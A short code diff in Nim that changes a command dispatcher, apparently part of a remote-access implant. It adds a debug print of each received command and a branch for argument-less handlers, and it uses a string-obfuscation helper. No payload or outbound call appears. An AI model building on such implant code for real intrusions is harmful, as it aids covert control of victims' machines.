@@ -58,7 +58,7 @@ var dispatcher = {
 
 # Parse user commands that do not affect the listener object here
 proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]) : string =
-
+    echo obf("DEBUG: Parsing command: ") & cmd
     try:
         # Parse the received command
         let dispatch = dispatcher.getOrDefault(cmd, CommandDispatch())
@@ -66,6 +66,8 @@ proc parseCmd*(li : Listener, cmd : string, cmdGuid : string, args : seq[string]
             return dispatch.handlerWithListenerAndGuid(li, cmdGuid, args)
         elif dispatch.handlerWithListener != nil:
             return dispatch.handlerWithListener(li, args)
+        elif dispatch.handlerEmpty != nil:
+            return dispatch.handlerEmpty()
         elif dispatch.handler != nil:
             return dispatch.handler(args)
         else:
